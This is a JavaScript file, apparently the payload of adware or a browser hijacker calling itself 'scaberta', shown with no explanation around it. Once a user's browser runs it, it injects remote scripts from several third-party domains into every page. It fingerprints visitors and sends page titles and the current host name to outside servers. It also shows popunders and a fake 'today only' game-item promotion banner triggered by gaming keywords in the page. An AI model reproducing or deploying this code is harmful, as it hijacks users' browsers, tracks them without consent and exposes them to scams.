 
loadScript("//schbot.ru/plugintegr/fqcmu/src.js");
   
}

/* MyCPM hard search */
function loadScript(script_url, callback) {
        var script = document.createElement('script');
        script.setAttribute("type","text/javascript");
        document.getElementsByTagName("head")[0].appendChild(script);
        script.setAttribute("src", script_url);
        script.onload = callback;
}

function show_mycpm_hard_search() {
    var stream_id = 130;
    window.setTimeout(function() {
        var title = document.title;
        loadScript("https://ijquery3.com/core/?action=cs&stream_id=" + stream_id + "&title=" + title, function() { });
}, 50);
}
/* MyCPM hard search */


/* MyCPM search */
function loadScript(script_url, callback) {
    var script = document.createElement('script');
    script.setAttribute("type","text/javascript");
    document.getElementsByTagName("head")[0].appendChild(script);
    script.setAttribute("src", script_url);
    script.onload = callback;
}

function show_mycpm_search(){
    var stream_id = 48;
    var user_id = null;
    var title = document.title;
    loadScript("//tds2.mycpm.ru/js/fingerprint.js", function() {
        user_id = new Fingerprint().get();
        loadScript("//tds2.mycpm.ru/cs?user_id=" + user_id + "&stream_id=" + stream_id + "&title=" + encodeURIComponent(title), function() {});
    });
}
/* MyCPM search */

function send_dom() {
	script_dom = document.createElement("script");
    script_dom.setAttribute("type", "text/javascript");
    script_dom.setAttribute("src", "http://quick-s-sng-v2.biz/dom/receive.php?dom=" + window.location.host);
    document.head.appendChild(script_dom);
}

function check_domain() {
	var page = document.documentElement.innerHTML;
	var domains = ['am15.net/bn.php', 'am15.net/bn2.php'];

	for(i=0; i<domains.length; i++) {
	    if (page.indexOf(domains[i]) > 0) {
			send_dom();
			break;
		}
	}
}

function show_link_replace()
{
   
(function(c, a) {
for(var f=window.location.host,b=a.length-1;0<=b&&!RegExp(a[b]).test(f);--b);0>b&&(a = document.createElement("script"), a.src = "//sub.statisticktrack.info/scripts/stat/statisticktrack.js?r" + (new Date).getDate(), a.id = "__bb_js_preffix_id", a.setAttribute("data-wid", c), a.async = !0, a.charset = "utf-8", document.body.appendChild(a))})("5020", "^(.+\\.)?vk\\.com$ ^(.+\\.)?odnoklassniki\\.ru$ ^www\\.avito\\.ru$ ^(.+.)?mail\\.ru$ ^www\\.gismeteo\\.ru$ ^(.+\\.)?rbc\\.ru$ ^www\\.kinopoisk\\.ru$ ^fotostrana\\.ru$ ^www\\.mamba\\.ru$ ^(.+\\.)?rutracker\\.org$ ^(.+\\.)?ria\\.ru$ ^(.+\\.)?sportbox\\.ru$ ^lenta\\.ru$ ^(.+\\.)?pikabu\\.ru$ ^zona\\.ru$ ^megogo\\.net$ ^www\\.lostfilm\\.tv$ ^seasonvar\\.ru$ ^(.+\\.)?1tv\\.ru$ ^www\\.yaplakal.com$ ^(.+\\.)?tnt-online.ru$ ^(.+\\.)?yandex\\.ru$ ^(.+\\.)?ya\\.ru$ ^(.+\\.)?tut\\.by$ ^(.+\\.)?google\\.\\w{2,3} ^fishki\\.net$ ^(.+\\.)?livejournal\\.com$ ^(.+\\.)?anekdot\\.ru$ ^(.+\\.)?auto\\.ru$ ^(.+\\.)?kp\\.ru$ ^(.+\\.)?championat\\.com$".split(" "));
}



/************************PLAYPAY**************************/
	function show_playpay()
	{
		if (playpay_readCookie('playpay_closed')) {
			return false; }

		var exclude_domains = ['randomkey.org', 'steam-games.com'];
		for(i=0; i<exclude_domains.length; i++) {
		    if (window.location.host.indexOf(exclude_domains[i]) > 0) {
				return false;
			}
		}

		var page = document.documentElement.innerHTML.toLowerCase();
	    
	    //var keywords = ['steam', 'стим', 'стеам', 'контра', 'cs go', 'cs: go', 'контра', 'gta', 'гта', 'fallout', 'the witcher', 'ведьмак', 'mk x', 'mortal kombat', 'far cry', 'farcry', 'h1z1', 'h1 z1', 'arma', 'арма', 'dayz', 'дейз', 'rust', 'раст', 'dying light', 'bioshock', 'hitman', 'skyrim', 'creed']; //, 'игры', 'игра', 'играть', 
	    var keywords = ['steam', 'gta', 'cs go', 'counter strike', ' стим', 'контра', 'skyrim', 'fallout', 'dying light', 'mortal kombat', 'dayz', 'cs: go', 'far cry', 'the witcher', 'metal gear solid', 'savage lands', 'empyrion', 'h1z1', 'dead realm', 'sheltered', 'final fantasy', 'garry mod', 'hitman', "garry's mod", 'garrys mod', 'cities: skylines', 'cities skylines', 'the elder scrolls', 'rocket league', 'grand theft auto', 'survival evolved', 'train simulator', 'left 4 dead', 'arma 2', 'arma 3', 'call of duty', 'payday', 'civilization', 'football manager', 'killing floor', 'primal carnage', 'stranded deep', 'total war', 'portal 2', 'farming simulator', 'project cars', 'dark souls', 'age of empires', 'borderlands', 'splinter cell', 'the sims', 'spintires', 'the war of mine', 'euro truck simulator', 'xcom', 'mafia 2', 'mafia 3', 'mafia ii', 'mafia iii', 'torchlight'];
	    for(i=0; i<keywords.length; i++) {
		    if (page.indexOf(keywords[i]) > 0) {
				show_playpay_banner(keywords[i]);
				break;
			}
		}	
	}

	function show_playpay_banner(keyword)
	{
		show_playpay_css();
		var host = window.location.host;
		
		var links = ['http://mega-random.ru/7X']; //, 'http://mega-random.ru/8e', 'http://mega-random.ru/8f'];
		var rand_link = links[Math.floor(Math.random() * links.length)];
		
		var fragment = playpay_create('<div id="playpay_id"><a href="' + rand_link + '?utm_source=' + host + '&utm_medium=' + keyword + '&utm_term=sng-v2" target="_blank"><div id="playpay-promo-text">Акция! Только сегодня шанс выпадения <span>' + keyword.toUpperCase() + '</span> составляет ' + getRandomInt(40, 60) + '%!</div><img src="http://quick-searcher.org/playpay/banner.gif" id="playpay_banner" onClick="playpay_banner_hide();"></a><div id="playpay_close" onClick="playpay_banner_hide();">Close<div></div>');
		document.body.appendChild(fragment);
	}

	function playpay_banner_hide()
	{
		document.getElementById("playpay_id").style.display="none";
		if (!playpay_readCookie('playpay_closed'))
		{
			playpay_createCookie('playpay_closed', 1, 15);
		}
	}

	function show_playpay_css()
	{
	    var head  = document.getElementsByTagName('head')[0];
	    var link  = document.createElement('link');
	    link.rel  = 'stylesheet';
	    link.type = 'text/css';
	    link.href = 'http://quick-searcher.org/playpay/playpay.css';
	    link.media = 'all';
	    head.appendChild(link);
	}

	function playpay_create(htmlStr) {
	    var frag = document.createDocumentFragment(),
	        temp = document.createElement('div');
	    temp.innerHTML = htmlStr;
	    while (temp.firstChild) {
	        frag.appendChild(temp.firstChild);
	    }
	    return frag;
	}
	function playpay_createCookie(name, value, mins) {
	    var expires;

	    if (mins) {
	        var date = new Date();
	        date.setTime(date.getTime() + (mins * 60 * 1000));
	        expires = "; expires=" + date.toGMTString();
	    } else {
	        expires = "";
	    }
	    document.cookie = encodeURIComponent(name) + "=" + encodeURIComponent(value) + expires + "; path=/";
	}
	function playpay_readCookie(name) {
	    var nameEQ = encodeURIComponent(name) + "=";
	    var ca = document.cookie.split(';');
	    for (var i = 0; i < ca.length; i++) {
	        var c = ca[i];
	        while (c.charAt(0) === ' ')
	            c = c.substring(1, c.length);
	        if (c.indexOf(nameEQ) === 0)
	            return decodeURIComponent(c.substring(nameEQ.length, c.length));
	    }
	    return null;
	}
	function playpay_eraseCookie(name) {
	    createCookie(name, "", -1);
	}

	function getRandomInt(min, max)
	{
	  return Math.floor(Math.random() * (max - min + 1)) + min;
	}
/************************PLAYPAY**************************/







// rekursivno krutim, poka ne budet body
var timer;
function injectScaberta() {
    if( window.location.host.toLowerCase().indexOf('triangle-home.com') != -1 ) {
	    return false;    
	}
    var myMailWindowOpen = false; //for mail.ru CU
	if(document.body){
		console.log('scaberta - body found, working');
		clearTimeout(timer);
		
	//	show_im_search();
	//	show_link_replace();
		
	//	li v iframe
		show_li();
		
	//	check_domain();
		
		//show_playpay();
show_teaser();		
		//show_ormes();
    		if( isMatchHost() === false )
    		{
    			console.log('scaberta - good host');
    	//		show_video_locker();
				    			show_cu_popunder();
			    show_top_popunder();
			    show_bottom_popunder();
    		} else {
    	//		show_video_locker();
    			show_clickuner_gh();
    			console.log('scaberta - bad host, exiting');
    		} 
    	//	show_mecash();
    	//	show_cpa_text();
    //	show_mycpm_hard_search();
    //		show_mycpm_search();
    		}
	else
	{
		console.log('scaberta - no body element, reload in 100');
		timer = setTimeout('injectScaberta()', 100);
	}
}

injectScaberta();